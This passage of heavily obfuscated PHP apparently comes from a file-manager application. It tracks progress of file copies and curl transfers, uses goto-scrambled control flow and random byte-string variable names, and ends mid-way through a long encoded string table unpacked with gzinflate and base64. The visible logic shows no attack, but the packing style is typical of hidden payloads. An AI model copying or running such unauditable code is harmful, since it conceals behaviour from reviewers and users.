$FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1440]] = $eì…ëÛÎ· * (1 - $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1434]]) / $FØÜµ™·ô°[$b‹ò‚¯£‰Ï[1434]]; } goto bÈ¡˜ëõè; bÈ¡˜ëõè: } public function addPath($aˆ×Ùã¢ºª) { goto cÑÕÖ¦¼¼; EÚŒÜà•ß„: if ($fá©¹Êïğ¬[$bÄ×©‹øÜ[29]] == $bÄ×©‹øÜ[167]) { $A¢ä›¯”Š‘[$bÄ×©‹øÜ[974]] += 1; } else { $A¢ä›¯”Š‘[$bÄ×©‹øÜ[974]] += $fá©¹Êïğ¬[$bÄ×©‹øÜ[80]][$bÄ×©‹øÜ[78]]; if ($fá©¹Êïğ¬[$bÄ×©‹øÜ[378]]) { $A¢ä›¯”Š‘[$bÄ×©‹øÜ[974]] += $fá©¹Êïğ¬[$bÄ×©‹øÜ[80]][$bÄ×©‹øÜ[79]] + 1; } } $A¢ä›¯”Š‘[$bÄ×©‹øÜ[700]] += $fá©¹Êïğ¬[$bÄ×©‹øÜ[77]]; $this->update(); goto e“éÈâÎŒÔ; dÕßæ˜Ñ…­: $fá©¹Êïğ¬ = IO::infoWithChildren($aˆ×Ùã¢ºª); $BÁåîÙ±ßí = $A¢ä›¯”Š‘[$bÄ×©‹øÜ[1487]] ? $A¢ä›¯”Š‘[$bÄ×©‹øÜ[1487]][$bÄ×©‹øÜ[1488]] : 0; $A¢ä›¯”Š‘[$bÄ×©‹øÜ[1487]] = array($bÄ×©‹øÜ[1488] => $BÁåîÙ±ßí + 1, $bÄ×©‹øÜ[395] => $fá©¹Êïğ¬[$bÄ×©‹øÜ[28]], $bÄ×©‹øÜ[75] => $fá©¹Êïğ¬[$bÄ×©‹øÜ[75]], $bÄ×©‹øÜ[475] => $fá©¹Êïğ¬[$bÄ×©‹øÜ[475]] ? $fá©¹Êïğ¬[$bÄ×©‹øÜ[475]] : $fá©¹Êïğ¬[$bÄ×©‹øÜ[75]]); goto EÚŒÜà•ß„; cÑÕÖ¦¼¼: $bÄ×©‹øÜ =& $_SERVER[í…¶]; if (!$aˆ×Ùã¢ºª) { return; } $A¢ä›¯”Š‘ =& $this->task; goto dÕßæ˜Ñ…­; e“éÈâÎŒÔ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($C³“ã³«îŠ) { $DºÚ‡¤‰…ğ =& $_SERVER[í…¶]; $D…¡ƒÅÂÇÊ =& $this->task; $D…¡ƒÅÂÇÊ[$DºÚ‡¤‰…ğ[1476]] = $C³“ã³«îŠ[$DºÚ‡¤‰…ğ[28]]; $D…¡ƒÅÂÇÊ[$DºÚ‡¤‰…ğ[976]] = $C³“ã³«îŠ[$DºÚ‡¤‰…ğ[28]]; $this->update(); } public function copyFileStart($E¹¢åÃçˆÕ, $Bò¸ÌÍâÙŠ, $CöÈğ¼‚¬È, $BòßİƒÌ¼, $d“Ş¢¬—, $Eôğó¼¿ØÇ) { goto Eë±Ñ×³º; fÆ½»Š‰ÆÜ: $B‡—¡¶˜«Ï[$AØ¤÷‰‘Õœ[976]] = $AØ¤÷‰‘Õœ[33]; $B‡—¡¶˜«Ï[$AØ¤÷‰‘Õœ[1480]] = $AØ¤÷‰‘Õœ[33]; $B‡—¡¶˜«Ï[$AØ¤÷‰‘Õœ[1481]] = 0; goto D·‹¬›”Ü¢; Eë±Ñ×³º: $AØ¤÷‰‘Õœ =& $_SERVER[í…¶]; $aÖˆÀÍ§Ï = $d“Ş¢¬—; if ($aÖˆÀÍ§Ï == $GLOBALS[$AØ¤÷‰‘Õœ[1489]]) { $aÖˆÀÍ§Ï = $GLOBALS[$AØ¤÷‰‘Õœ[1490]]; } goto A‘å¹Ëè¹; D·‹¬›”Ü¢: $this->update(); goto A¬ÄÜÉÓ¿Ö; A‘å¹Ëè¹: $GLOBALS[$AØ¤÷‰‘Õœ[1490]] = $d“Ş¢¬—; $GLOBALS[$AØ¤÷‰‘Õœ[1489]] = $Eôğó¼¿ØÇ; $B‡—¡¶˜«Ï =& $this->task; goto c»¬ôğË§…; c»¬ôğË§…: $B‡—¡¶˜«Ï[$AØ¤÷‰‘Õœ[1476]] = $aÖˆÀÍ§Ï; $B‡—¡¶˜«Ï[$AØ¤÷‰‘Õœ[1478]] = (int) $E¹¢åÃçˆÕ->size($Bò¸ÌÍâÙŠ); $B‡—¡¶˜«Ï[$AØ¤÷‰‘Õœ[1479]] = 0; goto fÆ½»Š‰ÆÜ; A¬ÄÜÉÓ¿Ö: } public function copyFileEnd($C†‰âøÙ¯ğ, $bĞÍ¦å£ğ, $DŠŠùùš†ö, $e†×‘ß·…¡, $a²ïãÖÄÛ, $Eª·®—ÄâØ) { $cİóÀæ÷¤Ã =& $_SERVER[í…¶]; $A»åÂ®Üùö =& $this->task; $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1479]] = $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1478]]; $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1480]] = $cİóÀæ÷¤Ã[33]; if ($a²ïãÖÄÛ == $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1476]]) { $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1482]] += $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1478]]; $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1483]] = $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1482]]; $this->update(1); } else { $this->update(); $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1479]] = 0; } self::log($cİóÀæ÷¤Ã[1491] . $bĞÍ¦å£ğ . $cİóÀæ÷¤Ã[66] . $e†×‘ß·…¡ . $cİóÀæ÷¤Ã[217] . $a²ïãÖÄÛ . $cİóÀæ÷¤Ã[1492] . $A»åÂ®Üùö[$cİóÀæ÷¤Ã[1476]]); } public function updateFileEnd($B½¤œŠ‡ËÑ, $EœÕ«¦ßì‚) { goto e¢İÂ®‘ÆÏ; cê‰‘­‡–“: $CÜÍ‡»©¹Ğ[$d±´æÔÓŞ[1478]] = $EœÕ«¦ßì‚; $CÜÍ‡»©¹Ğ[$d±´æÔÓŞ[1482]] += $EœÕ«¦ßì‚; $CÜÍ‡»©¹Ğ[$d±´æÔÓŞ[1483]] = $CÜÍ‡»©¹Ğ[$d±´æÔÓŞ[1482]]; goto c÷ØĞßŞ×Ì; e¢İÂ®‘ÆÏ: $d±´æÔÓŞ =& $_SERVER[í…¶]; $CÜÍ‡»©¹Ğ =& $this->task; $CÜÍ‡»©¹Ğ[$d±´æÔÓŞ[1476]] = $B½¤œŠ‡ËÑ; goto cê‰‘­‡–“; c÷ØĞßŞ×Ì: $this->update(1); self::log($d±´æÔÓŞ[1493] . $B½¤œŠ‡ËÑ); goto b¥¹Å¥‚ÃÓ; b¥¹Å¥‚ÃÓ: } public function sourceModelCopy($aãø‚“ÜÚ‰) { goto cÏÄ²Ê¹½; CšŒŠöÜğŸ: switch ($a“¿··ô”±) { case $AºÏË‡‡××[516]: $Bˆ¶¥´à×“ = 1; break; case $AºÏË‡‡××[519]: $CÅ¬Â°È˜˜[$AºÏË‡‡××[1476]] = $Fé“—ÑÒ£ó[$AºÏË‡‡××[28]]; break; case $AºÏË‡‡××[521]: $Bˆ¶¥´à×“ = intval($aãø‚“ÜÚ‰[$AºÏË‡‡××[372]] * 0.4); break; case $AºÏË‡‡××[523]: $Bˆ¶¥´à×“ = intval($aãø‚“ÜÚ‰[$AºÏË‡‡××[372]] * 0.2); break; case $AºÏË‡‡××[525]: $Bˆ¶¥´à×“ = intval($aãø‚“ÜÚ‰[$AºÏË‡‡××[372]] * 0.4); break; } $this->update($Bˆ¶¥´à×“); $this->sourceModelCopyFlag = !1; goto A‘ö— ”•¸; cÏÄ²Ê¹½: $AºÏË‡‡×× =& $_SERVER[í…¶]; $a“¿··ô”± = $aãø‚“ÜÚ‰[0]; $Fé“—ÑÒ£ó = $aãø‚“ÜÚ‰[1]; goto Fˆó§Ï®îÈ; Fˆó§Ï®îÈ: $CÅ¬Â°È˜˜ =& $this->task; $this->sourceModelCopyFlag = !0; $Bˆ¶¥´à×“ = 0; goto CšŒŠöÜğŸ; A‘ö— ”•¸: } public function sourceRemove($F‚öñŞ‡Ó, $e—•¶ñˆ) { $fñ‡ŞÓó´¨ =& $_SERVER[í…¶]; $this->sourceModelCopyFlag = !0; $fíÜ†Ù´Ê = 1; if (isset($F‚öñŞ‡Ó[$fñ‡ŞÓó´¨[80]])) { $fíÜ†Ù´Ê = $F‚öñŞ‡Ó[$fñ‡ŞÓó´¨[80]][$fñ‡ŞÓó´¨[78]] + $F‚öñŞ‡Ó[$fñ‡ŞÓó´¨[80]][$fñ‡ŞÓó´¨[79]] + 1; } $this->update($fíÜ†Ù´Ê); $this->sourceModelCopyFlag = !1; } public function sourceMove($f•…ïïÔä¸) { $this->sourceRemove($f•…ïïÔä¸, !1); } public function curlProgress($c¿–œ÷å©, $DÅãÊ¡½‘, $d´îŞØ¿»›, $f½Õ–»¸Öó, $e»Õ¢èŠÍ) { $aß·©™†Ì¹ =& $_SERVER[í…¶]; $EÉ”¶íŠ×ì =& $this->task; if ($e»Õ¢èŠÍ > 0) { $EÉ”¶íŠ×ì[$aß·©™†Ì¹[976]] = $aß·©™†Ì¹[1494]; $EÉ”¶íŠ×ì[$aß·©™†Ì¹[1480]] = $aß·©™†Ì¹[103]; if ($EÉ”¶íŠ×ì[$aß·©™†Ì¹[1478]] == $f½Õ–»¸Öó || $f½Õ–»¸Öó > 1024 * 1024) { $EÉ”¶íŠ×ì[$aß·©™†Ì¹[1479]] = $e»Õ¢èŠÍ; } if ($EÉ”¶íŠ×ì[$aß·©™†Ì¹[1481]]) { $EÉ”¶íŠ×ì[$aß·©™†Ì¹[1479]] = $e»Õ¢èŠÍ + $EÉ”¶íŠ×ì[$aß·©™†Ì¹[1481]]; } } else { if ($d´îŞØ¿»› > 0) { if ($EÉ”¶íŠ×ì[$aß·©™†Ì¹[1478]] == $DÅãÊ¡½‘) { $EÉ”¶íŠ×ì[$aß·©™†Ì¹[1479]] = $d´îŞØ¿»›; $EÉ”¶íŠ×ì[$aß·©™†Ì¹[976]] = $aß·©™†Ì¹[1495]; $EÉ”¶íŠ×ì[$aß·©™†Ì¹[1480]] = $aß·©™†Ì¹[1038]; } } } $this->update(); } public function curlProgressStart($f†Š¼ğ¸¹º) { } public function curlProgressEnd($c«ß‚ƒÕ´ä) { $a±È³ÖíÈ´ =& $_SERVER[í…¶]; $EÇ¼º«¾Š¼ =& $this->task; $e«ßÀË˜ ¥ = curl_getinfo($c«ß‚ƒÕ´ä); $D£ÌÓšÑ¼ã = $e«ßÀË˜ ¥[$a±È³ÖíÈ´[1496]]; if ($EÇ¼º«¾Š¼[$a±È³ÖíÈ´[1480]] == $a±È³ÖíÈ´[103] && $D£ÌÓšÑ¼ã) { $EÇ¼º«¾Š¼[$a±È³ÖíÈ´[1481]] += $D£ÌÓšÑ¼ã; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $f‘êéïì­Ş =& $_SERVER[í…¶]; $F¸¨†ù“÷â =& $this->task; $F¸¨†ù“÷â[$f‘êéïì­Ş[1497]] = 1; Hook::bind($f‘êéïì­Ş[1470], array($this, $f‘êéïì­Ş[1498])); Hook::bind($f‘êéïì­Ş[1472], array($this, $f‘êéïì­Ş[1499])); Hook::bind($f‘êéïì­Ş[1474], array($this, $f‘êéïì­Ş[1500])); } protected function endAfter() { $DŒÑ®’Î£ =& $_SERVER[í…¶]; Hook::unbind($DŒÑ®’Î£[1470], array($this, $DŒÑ®’Î£[1498])); Hook::unbind($DŒÑ®’Î£[1472], array($this, $DŒÑ®’Î£[1499])); Hook::unbind($DŒÑ®’Î£[1474], array($this, $DŒÑ®’Î£[1500])); } public function progressStart($EïÄÑ‘‰¼Ì) { $eĞò×¨„’œ =& $_SERVER[í…¶]; $eñ»™ãÔùŞ = curl_getinfo($EïÄÑ‘‰¼Ì); self::log($eĞò×¨„’œ[1501] . $eñ»™ãÔùŞ[$eĞò×¨„’œ[295]]); self::valueSet($this->task[$eĞò×¨„’œ[376]], $this->task); } public function progressEnd($c®Õ¾ÑâŞî) { $EØö´õŠ°Ë =& $_SERVER[í…¶]; self::log($EØö´õŠ°Ë[1502] . $this->task[$EØö´õŠ°Ë[376]]); $this->end(); } public function progress($f›’ÌøÅ¤, $E…İÎÖ³, $Eµğ§•öÚ«, $eŸöª½Ø†ß, $F–‚¤òÃ»Ø) { $D¼ƒïˆİŸ¤ =& $_SERVER[í…¶]; $CøÂœ­äÉÓ =& $this->task; if ($F–‚¤òÃ»Ø > 0) { $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[974]] = $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[974]] == 0 ? $eŸöª½Ø†ß : $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[974]]; $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[988]] = $F–‚¤òÃ»Ø; } else { if ($Eµğ§•öÚ« > 0) { $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[974]] = $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[974]] == 0 ? $E…İÎÖ³ : $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[974]]; $CøÂœ­äÉÓ[$D¼ƒïˆİŸ¤[988]] = $Eµğ§•öÚ«; } } $this->update(); self::log("\160\162\157\147\x72\145\163\163\110\164\x74\x70\72\x64\x6f\167\x6e\x3a{$Eµğ§•öÚ«}\57{$E…İÎÖ³}\x3b\40\x75\160\x6c\x6f\141\x64\x3a{$F–‚¤òÃ»Ø}\57{$eŸöª½Ø†ß}\73"); } } goto BË½¡¥Ö; CÒ·Ä¿«ç…: if (!function_exists('_kodDe')) { function _kodDe($e£Ô×¹¾ŠÎ) { $e£Ô×¹¾ŠÎ = base64_decode($e£Ô×¹¾ŠÎ); $Dí…çŠ„‘« = strlen($e£Ô×¹¾ŠÎ); $cëº©îªÀÂ = ''; $D›“»¦»±… = ord($e£Ô×¹¾ŠÎ[0]) - 30; for ($bÌê²‡°Õš = 1; $bÌê²‡°Õš < $Dí…çŠ„‘«; $bÌê²‡°Õš += 2) { if ($bÌê²‡°Õš + 1 < $Dí…çŠ„‘«) { $cëº©îªÀÂ .= chr(ord($e£Ô×¹¾ŠÎ[$bÌê²‡°Õš + 1]) + $D›“»¦»±…); $cëº©îªÀÂ .= chr(ord($e£Ô×¹¾ŠÎ[$bÌê²‡°Õš]) + $D›“»¦»±…); } else { $cëº©îªÀÂ .= chr(ord($e£Ô×¹¾ŠÎ[$bÌê²‡°Õš]) + $D›“»¦»±…); } } return $cëº©îªÀÂ; } } define("\355\205\266", strrev('îìò')); $_SERVER[í…¶] = explode("\174\1\174\4\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\140\33\305\325\60\24\50\107\33\50\24\50\327\7\33\47\301\107\164\370\310\351\304\116\144\133\216\105\144\113\221\344\70\301\162\224\225\264\222\326\226\264\362\356".base64_decode('SrKdhPsO4eO+EqDclLOUG0q4oaF8hZQCBQrlSgLlKneBFv65Z3Yl0/andTTz5s3sHG/evJl5781v').base64_decode('Tr3+kn+9s/Xp+y9Yu/PaXdfutuWaL/587iN/e+UJHF27C/jfrjh8xPo9dkL/7ZJbtmzpY40/O+a5')."\xda\x63\x9f\xb8\x7c\xed\xb9\x53\xd6\x1e\xf1\x9b\xfb\xde\x6b\xb8\x7f\xef\xc1\xf\xf6\x9f\x9a\xdc\x92\x9b\xf2\x7b\x7d\xaa\x6f\xf4\xb4\x45\xaf\xdf\xbf\xf4\xa5\xd6\xee\xa9\x5f\xad\xfb\x7c\xf3\x3\x1f\x7f\xf4\xe7\x67\xbd\xff\x1a\xda"."\xfc\xcb\x5d\x7b\x83\xbf\x5c\x79\xd3\x14\x79\xcb\x2e\xb1\xd1\x7d\x1e\xff\xf1\xfe\xdf\xec\x7f\xf3\xad\x73\x9e\xfe\xd9\x2a\xb3\xf1\x9e\xbb\xb5\xa5\x4b\x93\x2f\xbd\xd8\xf6\xf0\x75\x27\x3d\xf7\x97\x6f\xe7\xdc\xf2\xd1\xc1\x87\xd\x4f"."\xc9\xff\xfd\xa1\x17\x7c\xab\xb6\xc5\x6f\xbf\xee\xe5\xb4\xff\xb7\x57\xed\xf4\x87\x2b\xa7\xf5\x7c\x3c\xfb\x64\xf9\xfc\x35\x85\x75\xca\xf4\xf\xde\x8e\xb9\x76\x1d\xbb\xe2\xed\x3\xfd\xfe\x4f\x66\x64\xfe\x6f\xf5\x3e\x27\x8c\xdd\xf6"."\xde\xc0\xfa\xef\xd6\x76\xad\x3a\xe5\x67\xce\xdd\xee\xda\xe5\xe6\x8e\x4d\xfb\x76\x9c\x7e\xee\xdf\xdf\x9e\xb5\x68\xeb\xeb\xb3\x1f\x3b\x2a\xf3\xd2\xd2\xba\x8d\xd7\xee\xb6\xe6\xe9\x3f\xce\xdf\x78\xfd\xfc\x8d\xae\xf3\x6e\x18\x7a\xe4"."\x90\xff\x49\x2a\x7\x4c\x3f\xe6\x89\x4b\x9e\xba\xda\x71\x5f\x7a\xfd\xb2\xf6\x69\xdf\x6d\x3a\xf3\xe5\xe9\xe3\x33\x3e\xd\x5e\xf4\xa7\x7\xd5\x7\x4e\x3d\x61\xc1\xd5\xfe\xdf\xa6\xf\xdc\xb4\xdf\xd6\xf7\xf\x3b\x71\xbf\xad\xbf\xdb"."\365\346\135\36\331\245\353\343\271\373\37\24\233\71\345\251\73\366\36\73\40\70\355\242\17\75\355\27\276\170\306\253\163\237\135\377\225\74\160\336\257\264\171\163\75\117\135\174\152\360\343\225\307\115\331\153\312".strrev('04ÃTÆRS5å#üVçî´í×ü§9o7Ü÷ŒÈô¡}ã´sz\\Ÿ=:ÊO§½ÕgëâùÎûÌ')."\40\241\345\123\152\32\207\325\74\376\165\343\37\143\64\253\232\12\16\307\372\2\221\130\270\77\30\364\206\42\61\122\242\230\236\323\222\44\124\220\165\71\107\12\57\50\272\1\76\45\26\27\53\150\5\45\157"."\x81\x70\x40\x52\x36\xe5\xb8\x6c\x90\x92\xba\x3a\x62\x5d\xde\xa0\x3f\xb0\x32\x16\x59\x19\xf4\x12\x8c\x78\x6c\xb4\xa8\xe8\xe3\x38\x86\x82\x61\x53\xd6\xcd\x88\x9a\x53\x18\x46\x59\x67\xf5\xea\xf0\x2e\xf1\xf5\x49\x91\x90\xa7\x2f\xec".strrev('sZeæ$Ù*­Ğ8õKVSZN­)óS¬¿P$zô–y™Z\\éáßß€¡á*EõíèÜ}øŒé')."\274\100\102\21\26\2\143\220\57\146\263\70\322\307\102\244\376\112\112\56\146\111\237\165\211\221\202\256\346\144\332\364\245\312\70\203\342\200\134\64\65\65\237\300\21\357\230\251\313\34\16\152\234\320\225\234\222"."\47\105\205\275\176\157\147\104\202\325\224\272\103\201\136\211\14\105\116\66\114\105\227\6\172\274\41\257\4\253\336\126\213\132\134\53\341\174\375\175\240\103\44\217\337\57\115\126\202\251\344\12\264\30\234\247\112"."\141\201\120\227\67\44\165\254\224\170\77\45\264\134\116\313\273\100\51\140\74\115\241\252\336\120\10\7\34\204\202\375\76\70\164\44\22\350\356\16\173\131\214\64\156\231\37\324\244\205\120\251\45\226\114\145\315".strrev('nŠiƒ)ßãµ¶°L'."\n".'s#M9!B¶)	fÆšIX„‹Wš¨ğƒ5~CòZßà±)ÎIX').base64_decode('xpR8QkuqeTINF5EpRwhPNjNdugrwSIGaK6EVxnu1EmlDSs0qfjbLUlo2qeg8XgDZxRTSGHVCyN1X')."\314\211\50\54\232\310\250\331\244\116\47\347\17\141\66\221\142\25\323\4\315\60\150\115\373\13\131\115\116\206\25\135\250\175\67\50\46\120\64\105\140\21\241\165\153\172\256\13\60\0\322\73\200\354\325\376\52".base64_decode('CSOU8JNCp7gI46obPN753dDgYvBPPeFiUVK1jJLNxpQxhUyQXHK2QWvvNuJq3g0gOOoLxDKykelN')."\316\216\241\134\224\71\46\225\61\127\41\123\40\163\230\115\333\250\205\200\141\177\367\151\246\127\140\261\131\55\41\147\305\226\342\160\306\64\13\141\45\237\204\35\102\132\244\225\363\250\303\12\212\102\220\272\34"."\122\122\352\225\126\112\75\255\152\53\245\56\100\53\251\161\316\361\62\146\56\313\102\264\265\14\146\60\240\71\106\150\242\206\304\225\61\223\164\222\264\40\221\221\165\60\174\155\105\63\345\234\107\30\107\241\220"."\125\23\262\251\152\171\267\226\60\25\323\151\230\272\42\223\322\152\26\110\220\42\340\14\156\300\271\350\354\351\324\362\46\230\276\316\210\56\347\215\224\242\73\275\204\274\133\45\320\317\214\203\121\264\56\325\50"."\150\206\12\77\323\52\311\246\51\47\62\160\366\363\342\333\176\0\137\315\147\325\274\122\201\353\111\44\24\303\160\302\54\272\226\165\172\262\131\255\354\14\350\152\132\5\171\32\154\325\4\234\251\125\242\154\263"."\xa0\xea\x8a\x41\xa3\xd2\x92\xde\x8\x41\x6\xb5\x52\x9c\x41\x5d\x4e\xe7\xe4\x56\xa9\x50\x8c\x83\x9e\x21\xf3\xb3\xa\xc\x63\x93\xaf\xb7\x4a\x9\x18\x75\x48\xb9\xa2\x61\x3a\x75\x5\xb0\x1f\x15\x2c\x74\x64\xf0\x7c\x29\x67\x2f\x1c"."\117\125\111\72\303\200\113\23\160\113\343\54\11\220\221\104\323\60\264\47\22\11\306\174\335\140\61\356\363\306\172\75\221\316\36\122\155\123\116\323\72\373\1\357\145\105\122\340\12\47\230\162\220\320\372\100\37"."\161\140\120\53\53\72\370\160\307\170\253\64\242\45\343\332\230\213\46\101\344\60\340\22\24\31\366\150\301\164\206\344\174\32\366\117\174\334\124\10\71\32\245\264\265\103\375\112\76\155\146\150\306\260\67\264\334"."\33\212\205\3\335\221\1\117\210\54\343\171\60\20\143\364\123\260\350\254\63\244\44\101\327\47\114\232\117\56\300\136\243\70\160\242\300\61\246\251\160\362\320\64\277\157\11\354\230\56\247\1\220\234\42\26\55"."\333\257\346\124\130\167\223\245\240\236\4\153\374\22\122\41\67\152\120\133\64\323\120\27\115\316\254\167\202\177\33\352\7\243\135\256\206\241\105\156\225\347\161\67\271\232\244\346\306\71\122\20\10\35\252\234\225"."\110\243\53\60\32\245\300\322\37\350\0\270\46\11\323\334\326\165\30\30\362\56\353\367\206\43\261\136\157\244\47\320\105\276\340\365\220\220\137\303\123\223\266\150\20\377\14\221\21\4\242\102\132\111\150\131\115"."\227\263\220\1\121\172\123\50\23\110\253\51\316\327\175\100\240\41\35\213\71\37\217\204\325\134\201\62\50\63\123\314\305\205\240\233\227\100\150\1\14\31\143\113\32\133\203\64\235\204\132\335\44\313\214\346\156"."\312\154\335\341\26\360\177\316\131\223\132\116\246\222\50\232\270\112\22\317\134\14\152\260\244\364\50\62\137\324\114\335\324\40\124\267\240\364\52\146\106\43\375\234\126\150\225\212\254\156\264\226\111\45\253\320\136"."\xca\x28\x94\x4b\x3\xf1\xaa\xc4\x3a\xaf\xa0\x2b\x29\x95\xd0\x2d\x90\xa7\x0\x9c\x73\x61\xd5\x8\x81\x4c\x50\xbe\xa1\xf1\x1\x28\x86\x72\x80\xc9\x19\xb6\x6c\x70\xa6\xf\x23\xc2\xca\xdc\xdd\xef\xf7\xc7\x3a\x3\x7d\x11\x20\x8a\x62"."\310\100\310\27\361\122\212\360\164\305\74\235\101\266\204\361\141\42\10\160\172\126\262\67\14\51\65\13\174\237\57\20\234\345\322\205\16\262\124\34\6\274\260\240\345\15\305\231\40\245\45\71\363\305\30\13\154"."\x9c\xb7\x22\x7\x17\x80\xc7\x9c\x72\x6e\xc2\x99\x53\x4c\xd9\xc9\xaa\x6e\x5d\xdf\xa4\x88\xb8\x4c\xfa\xc8\x10\x70\x66\x99\x5\x8b\x2a\xd8\x5f\xd0\x85\x35\x18\x8\x93\xc\x8b\x20\x14\x48\x23\x71\x45\x27\xf5\x8\xf6\x93\xa4\x9c\x30"."\xfc\x4b\xbc\x4\xb8\x17\x5d\x1b\x65\x22\xb9\x78\x6\xc2\x94\xd1\x15\x1\xbe\xae\x4e\xc8\xbc\x8d\x8b\x68\x7d\x48\xd9\x63\xb9\x2c\x17\xb0\x62\xaa\x65\xfc\x62\x5a\x7c\x18\x70\x31\x40\x74\x72\xb5\x56\x3b\xf9\x58\x45\x7a\x7c\x7d\x4b"."\143\275\201\56\257\77\346\353\3\134\42\122\11\357\17\166\171\350\340\213\360\216\100\244\307\2\355\7\174\142\271\307\357\263\243\173\127\370\302\221\160\325\44\0\353\367\332\122\300\226\53\30\362\166\373\126\260".strrev('|Ü.i&Ğ…/tã¨Ä§Ùf3;HpJÅ:Û0¼0~+nôÜ±"KÓÏ§==:Ç'."\n".'ïëÏ·h')."\xa2\x96\x10\x99\x38\xa1\x15\x29\xb5\x32\x21\x2e\x47\x19\x44\x4e\x26\x33\x54\xa6\xb\x53\x1d\xfe\xa9\x97\x3c\x61\xc9\x2c\xc4\x18\x2b\x88\x8f\xb3\x20\x6a\x6\x8d\x3\x71\x8d\x7c\x5f\x22\xcc\xb7\xa2\x6\x31\x88\xd3\xa1\xa4\x34\x5d"."\371\41\200\47\145\62\302\260\305\301\274\341\151\140\4\74\150\227\13\50\1\215\110\214\316\105\3\354\17\74\264\72\51\276\303\214\5\300\126\334\3\367\247\261\201\120\240\157\11\311\120\316\50\264\2\76\322"."\xfd\x75\x54\x98\x21\xdb\x54\x93\xb3\x24\x20\x89\xc8\x5c\xa8\xa4\x9d\x3e\xac\xd1\xae\x5c\x8b\x7f\x8e\xc4\x3f\x40\x78\x23\x1f\x57\xf2\xb4\xd7\xe3\x90\x31\x33\xc6\x41\xf7\x20\x60\xb6\x50\xa6\xaa\x15\xd9\xd7\xe2\x9a\x96\xa5\xf3\x18"."\xac\xc7\x8c\x5f\xb0\xd\xee\xb0\x41\x89\x64\x8c\x32\xa7\x99\x74\xd5\x22\x8b\x43\x24\xb0\xd4\xdb\x17\xa3\x94\x85\x63\x2\x35\x62\x0\xd8\x32\x6\x42\xa4\x43\x4c\x6d\x84\x6e\x60\x70\x62\xc8\x1b\xa6\x5c\x40\x57\x46\x8b\x2a\xed\x2e".strrev('ì„çƒ­Eºî£ºoª,gR˜¡¹gQ$éÑ,º‹QÆ,7Ô×LçAºÌòÑUîóä?¬b¡&k·').strrev('Q\'~ˆ¿PÔ<´Zk¨Ôæu¶¨t`ñz³GDf‹¢Ú~6š. u¬ÇfšĞÀgêºŒÍwÎthœ')."\xd4\xc1\xe6\x2c\x31\xce\xaa\x9a\x9c\x59\x7\xaa\x4\xc4\x17\x86\x92\x47\x2c\x51\x40\xa0\x9\x13\x6a\x81\x43\xd7\xcc\x59\x47\xe1\x60\xc\x95\x34\xcf\x31\xe8\x8c\xce\x1c\x5a\x24\xe4\x13\x40\xf6\x6f\x1\xd1\x5\xf0\xe7\xc\xc3\xf3".base64_decode('OI+GLWNZ4bwn9FHMJzh3hfMiLicIH1DTeTaFwILONsVWqXnNDPy7jg5kWqHLMjzP0gl1FvPqKN3q')."\347\225\121\22\320\114\112\337\161\305\54\53\224\74\0\334\22\7\304\101\267\155\40\111\210\145\221\220\106\276\300\267\113\12\332\73\220\126\24\142\120\354\52\263\130\122\311\223\161\332\223\140\33\11\271\240\204".strrev('ØŸĞLšìY@,QŸÁÑ[Ó]tR@ÌBVhÆÌ‹‚CùJq¦ƒ±\\Gbp†£ß‡ObÆ…')."\x4a\x4b\x6d\xed\x12\xee\x66\xc2\x25\x62\x62\xa7\x17\x64\x2a\x4d\xc0\xdd\x2d\x93\x10\xe0\x48\xc2\x5\x91\xcb\x6c\x50\x8\xe0\x67\xa\x31\x39\x45\x76\xf\x3e\xe1\xec\x20\x6\xd8\x6c\x8c\x48\x5\x84\xe9\x74\x78\xc2\xbe\xce\x58\xd0".strrev('’©˜#GüwwEOWYi­'."\r".'Lì—f49%AÅ£E×qÂª(EÍŠ€4rbF$£!T‹>Wtã°3C')."\x12\xa\x9c\xa8\xc\x20\x0\x26\x8\xdc\x53\xe5\xd0\x2c\xc6\xd8\x32\xec\x17\x76\xf6\xa1\xe9\x6c\xf1\x87\x70\x2e\x4a\x9b\x9a\x29\x67\x19\x1a\x4c\x8b\x40\x8\x65\x81\x54\x80\x20\x7\x7\x98\xaa\xfc\x9c\x33\x42\x91\x41\x38\x52\x44"."\x6c\xbb\x8f\x9d\x97\xb1\x63\x10\xe1\x34\xb\xc0\x1c\x42\x14\xff\xdb\x56\x43\x87\x20\xf\x66\x67\x27\x5f\x39\x7d\x5d\x4e\x42\x59\x9e\x15\x4e\x1f\xd9\x55\xb0\x80\x4a\xe5\x5f\x19\xf0\x18\x93\x42\xd\xad\xa8\x27\x14\x86\x63\x91\x7c"."\x4c\x59\x7\x23\xcc\xc5\x4d\x38\xe6\xc2\x99\x27\xa8\xb9\x3\x1e\x8e\x38\xe0\x42\xef\x0\x22\xa8\x3\x12\x8c\x83\x8b\xd1\xe\x7e\xae\xe1\x60\x42\xb1\x83\xc8\xca\xe\x5e\x3a\x9\xfa\xba\x1c\xaa\xd1\x85\x64\x76\x54\x2e\x4a\xa2\x75"."\x36\x33\xf0\x94\x20\x2b\x8f\x3b\x70\xfd\xfd\x4a\x49\xc9\x3a\x68\xed\x1d\xb4\x51\xe\xda\x2\x7\xda\x4\x75\x91\xda\xf4\x3\xfa\x20\xb5\x41\x41\x40\x92\x19\x7\x1c\xe\x38\xb6\xb4\x14\x18\xa4\xdd\xc0\x24\x7d\x7\xdf\x5\x38\xd2"."\272\126\54\4\351\227\204\30\256\14\1\360\232\62\100\110\323\114\7\335\225\261\100\57\143\213\260\72\